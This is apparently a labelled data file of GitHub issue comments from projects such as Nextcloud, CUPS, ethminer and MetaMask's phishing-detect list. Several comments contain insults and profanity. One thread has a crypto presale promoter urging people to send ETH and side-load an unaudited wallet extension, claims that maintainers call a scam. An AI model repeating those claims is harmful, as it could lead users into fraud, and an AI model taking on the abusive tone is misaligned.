contacts/nextcloud/986/471489615,"Let's tackle them one by one then. )  what about not having an org name? Does he phone displays properly? What about the nextcloud's ui? Is it behaving properly? Because then this is an iOS issue. If the vCard we generate is correct according to the standards, then iOS is just not following them confused   ",,False,False,986
contacts/nextcloud/986/471492471," Almost.  Where it shows the phone number or email type (e.g. Home, Work), it actually shows in all capitals with a leading double quote (e.g. ""HOME, ""WORK).  This appears to work fine.   This wasn't an issue prior to the 3.0.3 (ish) update I believe.  It was working fine for a long time, then I did a new install on a new server and contacts wasn't quite right. ",,False,False,986
contacts/nextcloud/986/472612318,@friend where do you generate the .vcf file?  I'm going to try and fix it myself. ,,False,False,986
contacts/nextcloud/986/475403075,@friend is more info needed?  I've confirmed the vcf is erroneous in ios and Outlook.  Seems like a bug. ,,False,False,986
contacts/nextcloud/986/475689282,"Sorry, this one slipped through ) Please post a screenshot of every vcf that failed and the associated vcf file. I need to have a proper visibility of what error/issue we have for each case. It's getting confusing for me with all those vcard example on every issues see_no_evil ",,False,False,986
contacts/nextcloud/986/475763835,"@friend they're all the same as the example above.  The problem is with the quotation marks on the phone number type (e.g. ""work,voice"").  If I remove the quotes it works in ios and outlook. Something is applying tags wrongly and it's causing the vcf to be invalid. Let me open a new issue for this vcf error.  This one should stick to the problem of company name over taking the person's name. ",,False,False,986
contacts/nextcloud/986/478929745,"@friend edited a contact on my phone and it wiped all the numbers for that contact.  Contact shows in the list in the app online, but no numbers. This app is now fundamentally broken, and there is a lack of reply from development, so I'm classing this as closed and moving to an alternative. ",,False,False,986
contacts/nextcloud/986/478945801,"@friend I'm sad to hear that! Lots of development is pushed towards this app, but maybe not on this issue. There are a lot of requests or discussions, and not only on the contacts app. Different priorities and focus. This is still an open source project, anyone can contribute. Could you help and fix the issue maybe? That would be awesome! ",,False,False,986
contacts/nextcloud/986/478947477,"@friend I would consider inability to edit contacts on a phone, names being incorrectly shown due to a feature attempt by devs, and incorrectly formatted vcf files as pretty fundamental and high priority. Unfortunately, I did ask questions to get me started above, but was ignored.  So I'm out. ",,False,False,986
contacts/nextcloud/986/478949596,"Sure, I would too! Unfortunately I was not able to properly understand your issue. I'm sorry I was not able to provide the solution in the timeline you expected. I wish you a good day! Cheers, John ",,False,False,986
contacts/nextcloud/986/478970883,"@friend we are a community-driven project, so sometimes replies or debugging issues can take some time. The more info you provide, the easier it is to reproduce and fix it. Please be mindful of that and keep a friendly tone according to our Code of Conduct ",,False,False,986
contacts/nextcloud/986/478973656,"@friend a community I support with various bug reports and information, along with an attempt above to join it directly (as mentioned, was ignored). It's disappointing that only when I complain I get quick replies.  I have continuously responded and waited, only to be told that more info is needed after I indicate I'm done waiting - couldn't have said it sooner? I've been polite and as helpful as possible throughout.  If the frustration shows, I suggest consideration be given to the cause and not the outcome. I won't be replying again.  As above, I'm using another app outside of Nextcloud. ",,False,False,986
core/opnsense/2036/354585943,"ok, it's understood (for now). lol, wut? You've just said it will be bridged, but ok, what's next there? Assign what ""this"" interface? Create bridge where? And why would one need to assign an interface here if he's supposed to create bridge ""separately""? It will make sense to specify bridge then may be? ok, if it's purely OpenVPN option you'd better refer to it as it's given in OpenVPN docs. It would be less confusing after all. P. S. This is the thing why one should never use any ""panels"" for whatever. It's simple to get things done with primary tools then to get through all that addons-stuff ",,False,False,2036
core/opnsense/2071/287308368,"Yeah, you know — those bridges that can be configured there interfaces_bridge.php What's worse — you don't allow to specify voluntary interface names in NAT rule editor. That's again (another) proof that with the approach you've chosen it's way wiser to install BSD and do needed config manually. ",,False,False,2071
core/opnsense/2071/356506240,"It's true. We're not fond of the approach of how bridges are integrated. For that reason we do recommend hardware switches which do the job just nicely for very little money of need be. However, in the scope of this ticket, what can we do to help make the system in place a bit less cumbersome? ",,False,False,2071
core/opnsense/2071/356532135,"Nope, you can't replace bridges with anything external; such virtual bridges can be used as glue for VPNs and LAN interfaces and so on. What does original OS allow? It allows entering any interface name in PF rule set. And, BTW, that really does make sense cause not all interfaces exist all the time. Some of them can be sprung/ceased during uptime. So, at least this approach ""don't narrow allowed choice scope"" would help to mitigate  this and similar problems. ",,False,False,2071
core/opnsense/2071/356626951,What is your use case? I'm terribly sorry for not being able to follow. ,,False,False,2071
core/opnsense/2071/356628470,That's exactly the thing! — Having hard coded values for option (interfaces choice in PF is an example) w/o giving users an ability to override them makes opnsense unable to follow. ,,False,False,2071
core/opnsense/2071/356628811,"Wait, are you questioning the GUI + config.xml approach now? I thought we were talking about bridges? ",,False,False,2071
core/opnsense/2071/356629366,"Ah, ok, we can't, because if we do that it won't be reproducible after config export + import. ",,False,False,2071
core/opnsense/2071/356629433,We also did. As to my very case — it's combining 2 network Ethernet LAN segments into a single one with VPN and bridging. But in fact I also mentioned it earlier  ,,False,False,2071
core/opnsense/2071/356629832,"well, PF allows you to specify anything as NIC name. The rules with it just won't have any effect if it's non present at run time. But, well, ok, you can't. That's the thing why it's not wise to install opnsense instead of BSD. ;) ",,False,False,2071
core/opnsense/2071/356630449,"The design goal is to not let the user edit raw files to provide verification and validation of the setup. It's not a console-based BSD, that's true. It's also uncommon to ""glue"" VPNs as normally network segregation is a wanted security aspect. ",,False,False,2071
core/opnsense/2071/356630643,"You're typical ""we know better what users need"". But in fact you're too lame to realize it ",,False,False,2071
core/opnsense/2071/356631194,proof ,,False,False,2071
core/opnsense/2071/356631202,"@friend be polite please, if OPNsense doesn't fit your needs, feel free to use any other product available.. ",,False,False,2071
core/opnsense/2071/356631226,"Ok, can I help you with something else? ",,False,False,2071
core/opnsense/2071/356631373,I never meant to be polite to stupidity ,,False,False,2071
core/opnsense/2071/356631596,"I guess that is a no then. ) Cheers, Franco ",,False,False,2071
core/opnsense/2071/356632010,Sure. I made up my mind; I'm also letting others know what they would face if they would try using pfsense^W opnsense. — Its lame developers won't allow you to achieve full potential of original opensource software they've combined into this very ergh project. ,,False,False,2071
cups/apple/5315/323772139,"I have an HP Photosmart Plus B210a which prints pages face up. I am trying to figure out how to configure Cups to print documents so that I don't have to reverse them by hand when they come out of the printer. I found a discussion on linuxquestions.org which summarizes a recommended fix  Add the line  *DefaultOutputOrder ""reverse""  to the file  /etc/cups/ppd/PrinterName.ppd  I have tried this with varying results. I printed twelve two-page documents to try to investigate what is happening. I tried printing via the  command, via Evince and via Okular. I tried using a ppd file with and without the  line, and I also tried specifying a default output order with  of ""reverse"" or ""normal"" lpoptions -dHP_Photosmart_Plus_B210a -o outputorder=reverse ... lpoptions -dHP_Photosmart_Plus_B210a -o outputorder=normal  The results   Ignores ppd line, honors lpoptions setting Evince Ignores lpoptions setting, honors ppd Okular Ignores both lpoptions and ppd  As with the reporter of #1679, I would have expected the PPD which is downloaded by default for my printer to give the ""correct"" behavior by default, which is to say, not requiring me to manually reverse long documents when they come out of the printer. I also tried the solution of #1679, using lpadmin -p printer -o outputorder-default=reverse lpadmin -p printer -o outputorder-default=normal  This setting was honored by Evince but not by  or Okular. Okular's print dialog allows the user to change the ouput ordering, but Evince's print dialog, which appears more ""standard"" to me, says ""Page Ordering Not available"". There was some mention of all documents going through  as a final filter. If this is true then it should be possible for Cups to give users a single point at which to configure output ordering, which works uniformly across all applications which might submit print jobs to Cups. In either case it should be documented what is the preferred way to deal with face-up printers. I humbly offer my suggestion that for ""outputorder=reverse"" to work intuitively as a per-job option, then it should interact with the per-printer option as a parity bit, e.g. reverse+reverse=normal, rather than as an ""override"" (reverse+reverse=reverse). In my experimentation it seems to be the latter, and I think this should be documented because it is somewhat different from the way that other options like ""page-ranges"" work. If I write a script to print the odd pages in order and then the even pages in reverse, I feel I should be able to get the same result (manual duplex) regardless of the printer model. In any case where the  man page says   -o outputorder=reverse       Prints pages in reverse order.  I think it maybe should say something like   -o outputorder=(reverse|normal)       Overrides printer output-order setting for this job. With       ""outputorder=reverse"", document will be reversed on       face-down printers, and correctly ordered on face-up       printers; and vice-versa for ""outputorder=normal"".  Here is my PPD file in case it helps HP_Photosmart_Plus_B210a.ppd ",,False,False,5315
cups/apple/5315/389912141,"OK, so I'm assuming from the list of applications you are using that you are using a Linux distribution of some sort. The PPD comes from the HPLIP project. Unfortunately, this isn't something we can help you with - either the cups-filters raster filter is not honoring the DefaultOutputOrder value in the PPD or the HPLIP driver isn't doing something right. Either way you need to start with your Linux distribution's bug reporter and go from there... ",,False,False,5315
cups/apple/5315/389954289,"Michael, I can submit the bug elsewhere but do you really mean to suggest that I need to know about HPLIP and cups-filters to understand why three different tools process the options I've set (using your software) in three different ways? What about the other questions I asked? You don't think any of your documentation needs to be fixed? Can you point me to the place in the documentation where you say which of lpadmin/lpoptions/PPD solutions is expected to make the printer work correctly with all CUPS clients? Who takes responsibility when other projects don't know how to interface correctly with your software? Can you give the HP people a hint on how the HP filter would need to be modified so that it respects the  setting not just with Evince print jobs but also with jobs submitted by Okular and ? Or how can Okular be modified so that it prints correctly on inkjets? Is there another brand of inkjet printers, which works correctly with CUPS? What about cups-pdf, I've noticed that when printing to the virtual PDF printer then  doesn't respect the lpadmin setting, Evince doesn't respect the lpoptions setting, and Okular doesn't respect either. Is that still an HP problem? Are you ever grateful to receive bug reports about your project? ",,False,False,5315
cups/apple/5315/389956054,"@friend The non-CUPS software is not following the standard interfaces that CUPS provides. IOW, this is either a bug in HPLIP or cups-filters. If they follow the standard interfaces you won't have to do a damned thing to have things Just Work™. We can't fix software that isn't ours... As for pstops, no not all jobs get routed through there. Maybe 18 years ago that was the case, but not today. As for the documentation, it is correct if the underlying driver or filters follow the standard interfaces. ",,False,False,5315
cups/apple/5315/390071106,"So cups-pdf is HP's problem too? Is there any Linux software you can name that interfaces with CUPS correctly? It would help to have an answer to this question, relating to the configuration of face-up printers ""Can you point me to the place in the documentation where you say which of lpadmin/lpoptions/PPD solutions is expected to make the printer work correctly with all CUPS clients?"" ",,False,False,5315
cups/apple/5315/390228055,"cups-pdf is from another developer. Both depend on cups-filters on Linux, which probably means that the problem lies with cups-filters. We do not document printing solutions for Linux, working or otherwise. We don't write or support the software, and we don't make the distributions. ",,False,False,5315
debug/visionmedia/547/298397520,"I use ES6 plus Babel plus optional uglify-js. Debug example to show the problem When I do NOT use , everything is ok and the output is However, when using ""color #CC9933""%s` argument. ",,False,False,547
debug/visionmedia/547/366812782,I'm trying to make a tiny project that shows the problem. ,,False,False,547
debug/visionmedia/547/366826173,"After hours trying to reproduce the issue in a fresh project, I've realized that the issue was due to the fucxxxx . Deleting it and  and calling  again fixed the issue. NPM is becoming really a pain nowadays... Sorry for the noise. ",,False,False,547
debug/visionmedia/547/369629508,"what's your uglifyjs config? I have same issue here. I set collapse_vars to false to avoid this issue before, but it's not working now. ",,False,False,547
debug/visionmedia/547/369633808,"No one, I just use . The issue, in my case, disappeared after a proper  and some complains to NPM stuff (which is a pain today). ",,False,False,547
debug/visionmedia/547/379780167,"Hi there, I've got the same issue over here (though minification happens via tinyify (which uses uglifyjs) in a Babelify-transformed Browserify project. I've tried re-installing the node_modules as suggested by @friend but didn't get anywhere. I don't have a  in this project. @friend  did you find a solution for this? ",,False,False,547
debug/visionmedia/547/397272319,"Thanks for the answer, sorry for the delay. I was using Browserify when I asked my question with uglifiify running uglify-js and could not find a way of directly passing options like  to it. Maybe that's where things got confused – I've since switched to Webpack with  and don't have this issue anymore. ",,False,False,547
debug/visionmedia/547/413123085,"I'm seeing the problem in uglifyjs-webpack-plugin, I've set the webpack.config to include and its still giving the weird ""color"" output reported by @friend ",,False,False,547
debug/visionmedia/547/413371124,"It would be good if this was documented, its an obscure hack to work around this issue with debug, and its unlikely people will find it in this closed issue. Even more obscure if you don't explicitly use Uglify, just the default webpack.  I had to add the following to get it to work. ",,False,False,547
debug/visionmedia/547/413584662,"When using tools like angular-cli,  isn't easily changed. It would be great if debug was able to work properly under default production webpack settings. ",,False,False,547
debug/visionmedia/547/413591428,"It would be even greater if libraries worked fine without depending on specific settings in other libraries. I think that's better than ""make it work for my use case, plz"". ",,False,False,547
debug/visionmedia/547/432721088,This issue is not really closed ... could be great to re-opened it ,,False,False,547
debug/visionmedia/547/432754117,"We're not doing anything crazy, here. We're not pushing Javascript to its limits, we're not expecting any weird or new syntax to work (at least, not until v4 when we switched to ES6). If UglifyJS is messing up code, that's its own fault. Please open a ticket there. It is not the job of a library like this to conform to random tools such as UglifyJS. They are supposed to accommodate the libraries upon which they operate, not the other way around. There is nothing actionable on 's end to fix anything, because there is nothing wrong here. UglifyJS should not be changing functional semantics, so if it does so in a breaking way, take it to the maintainer of UglifyJS. Or you can use something more modern and active, such as Babel or Terser. ",,False,False,547
debug/visionmedia/547/432765152,AFAIR I've no longer seen this issue by using Terser. 100% agreed with @friend. ,,False,False,547
debug/visionmedia/547/432974943,"We just tell that the printf syntax is unusable in minified version in browser, with a product out of the box and widely used like webpack (18.5M download) / uglify (35.1M). The answer of Uglify, we will know it, there is an option for that. Someone tell that it will cost 5% of js size. Every byte so heavily win is important. I will not make a migration of the minifier for ""only"" a logger problem. I will make the calls without printf syntax. it will be ugly, but in less 10 minutes it will be done. thank you for your no help. ",,False,False,547
debug/visionmedia/547/432976810,This isn't a logger problem. UglifyJS is breaking your code. That should be setting off alarms and red flags for you. You're welcome. Please take your attitude elsewhere. ,,False,False,547
dxvk/doitsujin/492/340106316,So in Farcry 5 a small issue regarding car steering has come up i can't turn left or right even when remapping the controls Software information Farcry 5 Mazed out System information  GPU R9 290X Drivermesa 18.1.3 Wine version 3.10 e-sync DXVK version 0.61   ,,False,False,492
dxvk/doitsujin/492/404066810,Input issue -&gt; not a DXVK bug. ,,False,False,492
dxvk/doitsujin/492/404150344,Any idea on how to fix the input issue ? I have xinput installed anything else would be big help Sent from my iPhone ,,False,False,492
dxvk/doitsujin/492/404285383,"This is not the place to ask that question, as it has nothing to do with DXVK. ",,False,False,492
dxvk/doitsujin/492/404300381,Getting real tired of lazy Linux assholes whatever dude you want to be a fuck face that’s not willing to help people so be it Sent from my iPhone ,,False,False,492
dxvk/doitsujin/492/404302777,Not going to bother with personal insults. ,,False,False,492
eth-phishing-detect/MetaMask/653/288451825,"Dear Meta Mask team, We found MetaMask have blocked access to our website EtherZero.org, we are making a ethereum fork and presell some coin to our early investors.  We also found some dangerous with the method to import private key into our website wallet or Meta Mask fork plugin to get EtherZero, so we will recommend users add a custom node to MEW or Meta Mask to get ETZ later. I don't know why Meta Mask block our site, it's unfair and please you can re-check it again, Thank you! ",,False,False,653
eth-phishing-detect/MetaMask/653/357557781,"MetaMask works find on the wallet when you search (EtherZero Wallet), same goes for KeepKey and Ledger Nano. Importing private key should only be done on websites which are secured (such as  or  . Also, please correct the sending address to buy ETZ, because first it was 0xe4ba55b67b5596eaac5000b724dff7e86ad83196, then it was 0xf33068d5e798f6519349ce32669d1ec940db1193 and now it is 0x7E416ACB49c0B0d928BAda074Bf6597D80740bC2. And only the last one (0x7E416ACB49c0B0d928BAda074Bf6597D80740bC2) is mentioned in the tweets, telegram messages, websites and blogs. Please correct this. ",,False,False,653
eth-phishing-detect/MetaMask/653/357562192,"  is not our website, don't go to there! And don't send ETH to anyone address. Our pre-sale have been paused! ",,False,False,653
eth-phishing-detect/MetaMask/653/357562282,But ethzero.org is marked for fake and the address was removed to send ETH so that's suspicious. And no Ledger Nano support on ethzero but there is on ethzero-wallet.org ?? ,,False,False,653
eth-phishing-detect/MetaMask/653/357562514," is our official website, don't go to others or your ETH will be stolen! ",,False,False,653
eth-phishing-detect/MetaMask/653/357562643,But every analytic urlscan says etherzero.org is fake?? ,,False,False,653
eth-phishing-detect/MetaMask/653/357566496,"Don't reply to my post, you can steal some ETH but just it. ",,False,False,653
eth-phishing-detect/MetaMask/653/357566741,"Lol, no code repository, no opensource, no whitepaper and now even taken down for illegal use of MetaMask. Give me a break. Changing ETH receive address 3 times and even sending it to your own wallets back and forth. The fork is real and claiming ETZ is real, but this is just childish. ",,False,False,653
eth-phishing-detect/MetaMask/653/357655465,"Hi Admin, Please have a look at our official telegram  and check it out what we are doing. Thanks! ",,False,False,653
eth-phishing-detect/MetaMask/653/357720314,"@friend I am the one who issued the blacklist.  You mention it's going to be a 11 ETZ/ETH fork in your bitcointalk post, but during sale I can buy 3300ETZ for 1 ETH - this doesn't add up. Everyone is sending funds to 1 address to buy these ETZ tokens which doesn't make sense in terms of a sale - how will you track and issue tokens to who contributed what with the correct amount? There was no whitepaper (at time of blacklist) You're asking people to import their private keys into 3rd party software that isn't auditable/released and say it's the only way to get your ETZ tokens. You say your team is 20 people with cooperative tasking with top dapp shops in India and Eastern Europe yet all your repos have 1 contributor from the ETZ team (which is an anonymous contributor) and that's just changing existing ETH/MetaMask/MEW branding to ETZ. Your fork was cancelled and 5 days later open up again with zero explanation.   ",,False,False,653
eth-phishing-detect/MetaMask/653/357733464,"Hi,  It's a 11 fork but we also pre-mine 97M, and 20M will be sold to early investors amd 77M will be reserved for reservation, i don't think it's illegal. We have released everything on the get ETZ page  before investors send ETH to us.   And we have refunded all the requests investors asked. You can check our address  and  ask investor send ETH to us from a compatible wallet and we collect the sending address from etherscan.io, so we can send ETZ to their addresses later.  WP have been uploaded  have found some dangerous with the method to import private key into our website wallet or Meta Mask fork plugin to get EtherZero, so we will provide users a custom node to be added to MEW or Meta Mask to get ETZ, or you can add your notes. You can find the info have been updated at  are 20 people team, 9 core team members in China, one team located in India, one in eastern Europe to help us. It's a hard fork project, so we forked other codes including Meta Mask, but we also would like to use Meta Mask  if it's compatible. We only use it as a test wallet.   PS 0 TX fee have been implemented on our test wallet ETZ's test wallet has been running on the test network and can download from here  tutorial   unzip wallet  open chrome//extensions/ in Chrome browser  drag the unzip folder to the extension interface  this is a Meta Mask version of the fork version of the wallet, the same as Meta Mask  in the telegram group you can add the administrator in private, we can send some ETZ test currency to you (only can be tested on the test net, later we will clear it).  We have explained it on our telegram before(at the first we want to hard fork ethereum, but then want to make a ICO instead as a private investor encouraged us made a ICO, but this way didn't work so we restarted the HF). It's 6180 members group, we didn't cheat anyone or their ETH, if you can proof it we won't said anything about the incorrectly flagged.   EtherZero has all the dream features needed by DAPP developers 0 TX fee, instant payments and high scalability(up to thousands of TPS). Made by Dapp developers, for Dapp developers. I thought we are doing a new ways for DAPP development, many developers will need these features. It's critical to our project as many users used Meta Mask, and we also recommended they to use Meta Mask and MEW for helding ETH to get ETZ for free for many times. If you need anything we would like to provide to you asap. Thank you very much! ",,False,False,653
eth-phishing-detect/MetaMask/653/357760322,"Sorry ETZ -- but you've lied to every investor. Your announcement articles that lead to people investing were stating only a modest 20M premine. You've since changed this completely. You are scammers. Note You edited your announcement post on  edited your advertisements TODAY and hid evidence of this fraud. Your own employees are contacting the press and warning people not to invest. You have no way of explaining what you have done to investors. All you can do is hide the evidence and tell stories. Your whole business is based on a lie in your marketing material (that you routinely change, just like the ETH addresses you have your victims send ETH to) claiming you can handle thousands of transactions per second, zero transaction fees, and somehow survive DDOS attacks. Where is the code? ",,False,False,653
eth-phishing-detect/MetaMask/653/357794747,Thanks @friend for this investigation. It can't be more clear this is a huge scam. ,,False,False,653
eth-phishing-detect/MetaMask/653/357799858,"Guys,  I think that you are all over-reacting.   I believe that the project has potential and has gained community support. ",,False,False,653
eth-phishing-detect/MetaMask/653/357834877,"Hi, Do your research more and you will find the true. We changed the plan just want to protect our early investors, they all get 10X ETZ at the same ETH sent. Do your research more and you will find the true. No one want a refund and if they ask, we just send back their ETH. They are not our employees ever! They want to work for us, but we rejected them. So bad things happenned. We didn't want to hide anything, just bc the code is not ready, it will be open soure soon. True is true and time will tell. Be a wiser man please! ---- On Mon, 15 Jan 2018 124034 -0600 etherenvoy &lt;notifications@friend.com&gt; wrote ---- Sorry ETZ -- but you've lied to every investor. Your announcement articles that lead to people investing were stating only a modest 20M premine. You've since changed this completely. You are scammers. Note You edited your announcement post on  edited your advertisements TODAY and hid evidence of this fraud. Your own employees are contacting the press and warning people not to invest. You have no way of explaining what you have done to investors. All you can do is hide the evidence and tell stories. Your whole business is based on a lie in your marketing material (that you routinely change, just like the ETH addresses you have your victims send ETH to) claiming you can handle thousands of transactions per second, zero transaction fees, and somehow survive DDOS attacks. Where is the code? — You are receiving this because you were mentioned. Reply to this email directly, view it on GitHub, or mute the thread. ",,False,False,653
eth-phishing-detect/MetaMask/653/357852192,"We changed the plan just want to protect our early investors, they all get 10X ETZ at the same ETH sent. Anyone want a refund and if they have asked, we just send back their ETH.  They are not our employees ever! They want to work for us, but we rejected them. So bad things happened. We didn't want to hide anything, just bc the code is not ready before the fork, it will be open source soon. And please read this article and you will find more interesting things ",,False,False,653
eth-phishing-detect/MetaMask/653/357857263,"Where is the code that allows for 10,000 tx/s and unlimited scalability on the Ethereum network?Vitalik has been wasting his time working on sharding -- I'm sure he'd like to see it. Where is it? Open the repository. Let people see. Why would you take investment with an advertisement of 116M total, and then, 3 days before launch, change it to 197 M total -- giving yourselves control of the entire market people invested in thinking it was a modest, decentralized fork? There is no why -- you lied to bitcointalk.org, lied to the media, lied to investors, lied to employees doing sales for you. ETZ, if it ever exists, will be worth very little after you centralize it and give yourselves total market control without warning the people who were investing for weeks. Are you still launching on the 19th -- 3 days from now? ",,False,False,653
eth-phishing-detect/MetaMask/653/357863248,"You must have not check our website and WP. The 10K TPS is the next phase of ETZ. Marketing plan always need to be changed to fit the resources we had. We have increased the total number of ETZ from 116M to 194M, but also provide 16.5 times of ETZ to our early investors. The price of ETZ is 10% of previous price. And we also issued refunds if anyone asked. We didn't have employees doing sales for us, just one man called David asked to work for us.  He also asked money to members from EtherZero telegram group and want to scam ppl for selling ETZ he didn't have. He is banned from the group. lol We have implemened 0 TX fee on our test wallet and testnet and the HF will be happened on 19th, Jan. ",,False,False,653
eth-phishing-detect/MetaMask/653/357865529,你需要理解一下。我没有讹诈你 。这不是勒索。 你对国外的投资者撒谎，人们生气。 这与我真的无关。我们谈实话可不可以？ When you started taking investment from westerners (1) You do not have the code done (2) You did not have a white paper (3) You were claiming 116M total ETH， after investment 197M. The market will be very different. 你开始拿到外国人的投资的时候 一 变成没做好，也没github 二 没有完成的WP 三 原来是116M，拿到投资以后你高速人是197M。市场，投资会超级不同的。 ,,False,False,653
eth-phishing-detect/MetaMask/653/357874175," As a chinese, I think you shouldn't be a translator as your chinese is really funny. ",,False,False,653
eth-phishing-detect/MetaMask/653/357875135," won't change anything on our article about you E E. Let me ask your questions  We had provide test wallet running on testnet before the presale - you didn't tell the truth  We have told our early investors WP will be updated soon, and they trusted us, and we also delivered our promise, the WP can be downloaded here  plan always need to be changed to fit the resources we had. We have increased the total number of ETZ from 116M to 194M, but also provide 16.5 times of ETZ to our early investors. The price of ETZ is 10% of previous price. And we also issued refunds if anyone asked."" - I have asked it before  Shame on you as a Chinese. EtherZero is a global project, we have many supporters from China, also many supporters from all of the world. You are hurting the reputation of EtherZero, and provide nothing else to the world. ",,False,False,653
eth-phishing-detect/MetaMask/653/357878392,"David, your sales employee, says you didnt pay him. He says you blocked him and banned him from the channel. Why did you do this? Are you going to pay him? He worked every day getting you ""investment"" while being told the cap was 116M. You take everyone's money first, fire your sales employee with no pay, and then you ""change the marketing plan"" and give yourselves 50% of the market in premined ETH? And you think I am worried you make up a conspiracy theory about me? I was interested in your platform -- it sounded good (0 gas fee, 999999 txps). You have no code though, and so I wrote it off as a scam and warned people. ",,False,False,653
eth-phishing-detect/MetaMask/653/357879789,"He is not our sales employee, he asked for help being an group supporter on our telegram channel. And we have paid him  are not telling the truth, we also had your chat log with David, if you want we can upload more. You can do what you want, but we won't pay you a penny as mentioned here ",,False,False,653
eth-phishing-detect/MetaMask/653/357881695,"I do mot want your moneu, guy. This has nothing to do with me. You lent David 0.1 ETH to buy a computer power supply. That is not his monthly salary. He is a european, he does not work for 0.1 ETH a month. I have my chatlog with David too, I was talking to him, worried that your company was a scam (which it seems to be!). You are hurting people you hired, who worked for you. You are such a fool. I am just one guy who thinks you are a scam, I am not important. Welcome to cryptocurrency where your project needs code and a meaningful whitepaper to not be a scam, tough I know. You have a contract with David, he was your employee, he made you money, and you are not going to pay him. Contracts do not matter to you. You change contracts as the market needs. You got millions in investment from 116m with no code, and then changed it to 197m today. You are so bad. ",,False,False,653
ethminer/ethereum-mining/1405/347101773,"Please stop with all the changes. Ethminer was absolutely fine, ran and performed great. -FS exit is sorely missed here at my end. I see you have finally made amends by adding failover-timeout, which does indeed now move batch file on to next algo. -P exit did not do this, as it was advised to do! However with latest ethminer 16 dev2. A drop of speed of just over 1mhs for me. not impressed. Print out of speed and gpu speed (the same thing) what is purpose of reporting 2 speeds? why you feel the need to make changes that are not needed I dont get. etminer is, kinda was, a great miner. Now you messing around with it too much. How you have managed to mess something up that was in such great condition I do not understand. Just stop, get back to basics, sort it and leave it. This transition should have been simple. ",,False,False,1405
ethminer/ethereum-mining/1405/410003589,"How is -P exit different to -FS exit  should work as before and did last i checked. Also if you dont like the changes don't use the newer versions, use different miner altogether or fork and only do stuff you like in a miner. ",,False,False,1405
ethminer/ethereum-mining/1405/410034425,no -P exit is not shifting batch file onto next algo nor is it behaving like -FS exit. Why do you think they have added this &gt; failover-timeout this command now exits ethminer and onto next miner. without that ethminer just loops trying to reconnect with -P exit or without.... my batch is for multi algo on mph. ,,False,False,1405
ethminer/ethereum-mining/1405/410074698,"1.) Report an issue and use an appropriate subject and fill it with constructive content 2.) 0.16.0.dev2 (remind the dev2) is a development snapshot - means current source compiled and bundled 3.) If you would supply us with more info like OS, GPUS, ethminer --list-devices, ... possible we can help better  getting back your missing 1MHs! 4.) failover-timeout is the time after that ethminer tries to reconnect to the main pool which is the first -P parameter (you must not specify the failover-timeout parameter !) 5.) Maybe you can explain more detailed what has changed and make problems as I still not understand Would be helpful to get (at least a part) of your batchfile to understand what's the problem 5.) If you like the old versions you can  download them at  the repo, go back in history and compile your preferred version  6.) Create PRs or Issues and submit us your sorted basics ",,False,False,1405
ethminer/ethereum-mining/1405/410082355,"the changes required to compensate for the mhs loss makes no difference. as the speed would be and is faster on v15, with any increments in power to gpu than v16. i got speed back. at same settings is over 16mhs on v15.... gpu is rx480 8gb ref. Al I want ethminer to do is what it did before and that is the -FS exit function. It is required to exit ethminer. I run a batch file that switches algos based on profitability, as i am sure a lot of other users do too. -P exit is not doing this for ethminer. Im terribly sorry I think I made a mistake regarding failover-timeout. I am currently testing it out and waiting on an algo switch. Im sure it did it, not 100% though. my apologies. ",,False,False,1405
ethminer/ethereum-mining/1405/410160063,To have the miner exit (with -P exit) imidently after a disconnect (of any kind) you need to use --farm-retries 0  (i think thats the param) otherwise it tries to reconnect up to 3 times to reconnect to current pool before switching to new pool (which is in our case the exit command) ,,False,False,1405
ethminer/ethereum-mining/1405/410262230,"nope. ethminer just wont exit and move onto next algo/miner in batch. -P exit, --failover-timeout 0, --work-timeout 1, --exit, --response-timeout 2, --farm-retries 1 none of these work. just keeps looping trying to reconnect to ethash algo. and none do what -FS exit did.  ",,False,False,1405
ethminer/ethereum-mining/1405/410272900,Can you repeat the very same test with 0.16 please ? ,,False,False,1405
ethminer/ethereum-mining/1405/410274576,And please remove --failover-timeout as it does not apply to your environment. ,,False,False,1405
ethminer/ethereum-mining/1405/410274961,"Also would be helpful if you could post the ""full"" command line arguments. it's not clear if you tested those one by one or in some sort of combination. ",,False,False,1405
ethminer/ethereum-mining/1405/410275011,that screenshot is from latest v16dev2. those commands were entered individually. they are a list not an order ,,False,False,1405
ethminer/ethereum-mining/1405/410275900,You should then test with ,,False,False,1405
ethminer/ethereum-mining/1405/410278190,does that work for you? as it is not for me. ive exhausted all combos with the above. i will wait it out and see what v16 final is like. back to claymore for now ( ,,False,False,1405
ethminer/ethereum-mining/1405/410283028,Could you please report what is the output of ethminer.exe -V I am asking as the output of your screen-shot does not appear to belong to 0.16 ,,False,False,1405
ethminer/ethereum-mining/1405/410286892,sure my mistake. same thing though.  ,,False,False,1405
ethminer/ethereum-mining/1405/410288316,Think I got where the problem is. Please one more last test ,,False,False,1405
ethminer/ethereum-mining/1405/410290366,Nevermind ... it won't allow --farm-retries 0 ,,False,False,1405
ethminer/ethereum-mining/1405/410290467,did you test that before you posted it? I have done that. before i even came here to make this post. if you had tested it you would not have posted it. by looks of it you have not even read the help files. im done with this for now. ,,False,False,1405
ethminer/ethereum-mining/1405/410295874,"First of all please calm down. We're here to help. I'm not here to undergo your rude attacks. I'm one of the devs and just now I am addressing this specific issue. (In particular I'm the one who has made most of the changes in the stratum protocol detection). So please, again, calm down and be patient. ",,False,False,1405
ethminer/ethereum-mining/1405/410323154,./ethminer -G --report-hashrate --HWMON 0 -P stratum+tcp//mhubaccount.workerx@friend.ethash-hub.miningpoolhub.com20535 --api-bind -3333 --cl-local-work 64 -P exit Results to this  think u are using wrong port number. ,,False,False,1405
ethminer/ethereum-mining/1405/410386011,"as far as i understand, what he wants is, that the miner exits after it gets disconnected from the pool for whatever reason. (pool closed, network error, whatever) I think that was the behavior with -FS exit.  So we should allow --farm-retries 0  and hint about that within the -P exit  command desc. I also would suggest renaming --farm-retries to something different (or alias it) like --pool-retries or something. ",,False,False,1405
ethminer/ethereum-mining/1405/410427327,@friend is right. There are some topics to take into account  --farm-retries should allow 0 which means no-retry at all on a failed connection ... step to next in queue actually there is a missing check on failure for mining.authorize method which does not invalidate connection. It should instead vector of connections should be accessed by the at() method instead of direct random access [] as we're removing invalidated connections. Direct random access [] does not throw if out of bounds while at() does. Problem is vector.erase method apparently rearranges it's internal array   Figure this where you have a vector of 2 elements (thus size() is 2) you'd expect vector now holding only 1 element (and in fact is) after removal of the first (of two) element. But here comes the problem. If you access vector like this  ♠cout &lt;&lt; m_connections[0].Host();` instead of getting the first (and only) element left (which should be reasonable) you get some sort of unspecified behavior which outputs data from some randomly allocated memory. ,,False,False,1405
ethminer/ethereum-mining/1405/410437062,"Correct, but this doesn't excuse the issuer's behaviour. ",,False,False,1405
